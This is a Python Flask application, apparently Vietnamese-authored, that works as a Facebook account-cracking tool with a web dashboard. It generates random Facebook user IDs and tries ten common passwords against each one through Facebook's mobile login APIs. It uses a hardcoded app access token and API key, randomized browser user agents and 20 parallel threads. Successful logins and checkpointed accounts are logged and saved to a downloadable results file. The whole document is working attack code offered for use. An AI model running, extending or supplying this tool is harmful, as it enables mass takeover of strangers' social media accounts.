from flask import Flask, render_template, request, jsonify, send_file, Response
import requests
import uuid
import random
import time
import os
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from datetime import datetime

app = Flask(__name__)

# Global variables
is_scanning = False
total_scanned = 0
found_accounts = []
total_uids = 0
log_queue = Queue(maxsize=1000)
current_scan_id = None

def add_log(message, level='info'):
    """Thêm log vào queue với timestamp"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    log_data = {
        'time': timestamp,
        'message': message,
        'level': level
    }
    try:
        log_queue.put_nowait(log_data)
    except:
        pass
    print(f"[{timestamp}] {message}")

def windows_user_agent():
    """Generate random Windows User-Agent"""
    versions = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.{random.randint(4000, 6000)}.{random.randint(100, 300)} Safari/537.36",
        f"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 130)}.0.{random.randint(5000, 7000)}.{random.randint(100, 400)} Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(90, 110)}.0) Gecko/20100101 Firefox/{random.randint(90, 110)}.0"
    ]
    return random.choice(versions)

def creation_year(uid):
    """Estimate Facebook account creation year based on UID"""
    uid_str = str(uid)
    if len(uid_str) == 15:
        if uid_str.startswith('1000000000'): return '2009'
        if uid_str.startswith('100000000'): return '2009'
        if uid_str.startswith('10000000'): return '2009'
        if uid_str.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid_str.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid_str.startswith('100001'): return '2010'
        if uid_str.startswith(('100002', '100003')): return '2011'
        if uid_str.startswith('100004'): return '2012'
        if uid_str.startswith(('100005', '100006')): return '2013'
        if uid_str.startswith(('100007', '100008')): return '2014'
        if uid_str.startswith('100009'): return '2015'
        if uid_str.startswith('10001'): return '2016'
        if uid_str.startswith('10002'): return '2017'
        if uid_str.startswith('10003'): return '2018'
        if uid_str.startswith('10004'): return '2019'
        if uid_str.startswith('10005'): return '2020'
        if uid_str.startswith('10006'): return '2021'
        if uid_str.startswith('10009'): return '2023'
        if uid_str.startswith(('10007', '10008')): return '2022'
        return 'Unknown'
    elif len(uid_str) in (9, 10): return '2008'
    elif len(uid_str) == 8: return '2007'
    elif len(uid_str) == 7: return '2006'
    elif len(uid_str) == 14 and uid_str.startswith('61'): return '2024'
    else: return 'Unknown'

def login_attempt(uid, method='1'):
    """Attempt to login with given UID"""
    passwords = ['123456', '1234567', '12345678', '123456789', '123123', '111111', 'password', '1234567890', '12345', '123456789']
    
    for pw in passwords:
        try:
            session = requests.Session()
            
            if method == '1':
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': str(uid),
                    'password': str(pw),
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                headers = {
                    'User-Agent': windows_user_agent(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
                res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, timeout=15)
                
                if res.status_code == 200:
                    resp = res.json()
                    if 'session_key' in resp:
                        add_log(f"✅ HIT | {uid} | {pw} | {creation_year(uid)}", 'success')
                        return (uid, pw, creation_year(uid))
                    elif 'checkpoint' in str(resp).lower():
                        add_log(f"⚠️ CHECKPOINT | {uid} | {pw}", 'warning')
                        return (uid, pw, creation_year(uid))
                        
            else:
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&generate_session_cookies=1&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                headers = {'User-Agent': windows_user_agent()}
                res = session.get(url, headers=headers, timeout=15)
                
                if res.status_code == 200:
                    resp = res.json()
                    if 'session_key' in str(resp):
                        add_log(f"✅ HIT | {uid} | {pw} | {creation_year(uid)}", 'success')
                        return (uid, pw, creation_year(uid))
                        
        except Exception as e:
            continue
    
    return None

def generate_uids(account_type, limit):
    """Generate UIDs"""
    uids = []
    limit = int(limit)
    
    if account_type == '2009':
        prefix = '1000004'
        for _ in range(limit):
            uids.append(prefix + ''.join(random.choices('0123456789', k=8)))
    elif account_type == '2010-2014':
        for _ in range(limit):
            uids.append(str(random.randint(1000000000, 4999999999)))
    elif account_type == '100003-100004':
        prefixes = ['100003', '100004']
        for _ in range(limit):
            uids.append(random.choice(prefixes) + ''.join(random.choices('0123456789', k=9)))
    else:
        # default random
        for _ in range(limit):
            uids.append(str(random.randint(1000000000, 9999999999)))
    
    return uids

def run_scan(account_type, limit, method, scan_id):
    global is_scanning, total_scanned, found_accounts, total_uids
    
    found_accounts = []
    total_scanned = 0
    
    add_log("="*55, 'info')
    add_log("🚀 AECR FACEBOOK SCANNER - BẮT ĐẦU QUÉT", 'info')
    add_log(f"📌 Loại: {account_type} | Số lượng: {limit} | Method: {method}", 'info')
    add_log("="*55, 'info')
    
    # Generate UIDs
    uids = generate_uids(account_type, limit)
    total_uids = len(uids)
    add_log(f"📋 Đã tạo {total_uids} UIDs, bắt đầu quét với 20 luồng...", 'info')
    
    # Clear old results
    os.makedirs('results', exist_ok=True)
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(login_attempt, uid, method): uid for uid in uids}
        
        for future in as_completed(futures):
            if not is_scanning or scan_id != current_scan_id:
                add_log("⏹ ĐÃ DỪNG THEO YÊU CẦU", 'warning')
                break
            
            total_scanned += 1
            result = future.result()
            
            if result:
                uid, pw, year = result
                found_accounts.append({
                    'uid': uid,
                    'password': pw,
                    'year': year
                })
                # Save to file immediately
                with open('results/found_accounts.txt', 'a') as f:
                    f.write(f"{uid}|{pw}|{year}\n")
            
            # Progress log every 20 scans
            if total_scanned % 20 == 0:
                progress = int((total_scanned / total_uids) * 100)
                add_log(f"📊 Tiến độ: {progress}% ({total_scanned}/{total_uids}) | Tìm thấy: {len(found_accounts)}", 'info')
    
    add_log("="*55, 'info')
    add_log(f"✅ HOÀN THÀNH! Đã quét: {total_scanned} | Tìm thấy: {len(found_accounts)}", 'success')
    if len(found_accounts) > 0:
        add_log(f"💾 Kết quả lưu tại: results/found_accounts.txt", 'info')
    add_log("="*55, 'info')
    
    is_scanning = False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan', methods=['POST'])
def start_scan():
    global is_scanning, current_scan_id
    
    if is_scanning:
        return jsonify({'error': 'Đang có tiến trình quét, vui lòng đợi hoặc dừng lại!'}), 400
    
    data = request.json
    account_type = data.get('account_type', '2010-2014')
    limit = data.get('limit', 100)
    method = data.get('method', '1')
    
    # Validate
    try:
        limit = int(limit)
        if limit < 10 or limit > 5000:
            return jsonify({'error': 'Số lượng UID phải từ 10 đến 5000'}), 400
    except:
        return jsonify({'error': 'Số lượng không hợp lệ'}), 400
    
    is_scanning = True
    current_scan_id = str(int(time.time()))
    
    # Clear log queue
    while not log_queue.empty():
        try:
            log_queue.get_nowait()
        except:
            break
    
    # Start scan thread
    thread = threading.Thread(target=run_scan, args=(account_type, limit, method, current_scan_id))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'status': 'started',
        'message': 'Đã bắt đầu quét!',
        'scan_id': current_scan_id,
        'total_uids': limit
    })

@app.route('/api/stop', methods=['POST'])
def stop_scan():
    global is_scanning
    if is_scanning:
        is_scanning = False
        add_log("⏹ Đang dừng tiến trình quét...", 'warning')
        return jsonify({'status': 'stopped', 'message': 'Đã yêu cầu dừng quét'})
    return jsonify({'status': 'idle', 'message': 'Không có tiến trình nào đang chạy'})

@app.route('/api/status')
def get_status():
    global is_scanning, total_scanned, found_accounts, total_uids
    
    progress = 0
    if total_uids > 0:
        progress = int((total_scanned / total_uids) * 100)
    
    return jsonify({
        'is_scanning': is_scanning,
        'total_scanned': total_scanned,
        'total_uids': total_uids,
        'progress': progress,
        'found_count': len(found_accounts),
        'latest_results': found_accounts[-50:]  # 50 kết quả gần nhất
    })

@app.route('/api/logs')
def stream_logs():
    """Server-Sent Events for live logs"""
    def generate():
        last_logs = []
        while True:
            try:
                # Get new logs
                while not log_queue.empty():
                    log = log_queue.get_nowait()
                    last_logs.append(log)
                    if len(last_logs) > 200:
                        last_logs.pop(0)
                    yield f"data: {json.dumps(log)}\n\n"
                time.sleep(0.5)
            except Exception as e:
                yield f"data: {json.dumps({'time': '00:00:00', 'message': f'Log error: {e}', 'level': 'error'})}\n\n"
                time.sleep(1)
    
    return Response(generate(), mimetype='text/event-stream', headers={
        'Cache-Control': 'no-cache',
        'X-Accel-Buffering': 'no'
    })

@app.route('/api/download')
def download_results():
    file_path = 'results/found_accounts.txt'
    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
        return send_file(file_path, as_attachment=True, download_name='aecr_results.txt')
    return jsonify({'error': 'Chưa có kết quả nào!'}), 404

@app.route('/api/clear')
def clear_results():
    file_path = 'results/found_accounts.txt'
    if os.path.exists(file_path):
        os.remove(file_path)
    return jsonify({'status': 'cleared', 'message': 'Đã xóa kết quả cũ'})

if __name__ == '__main__':
    os.makedirs('results', exist_ok=True)
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)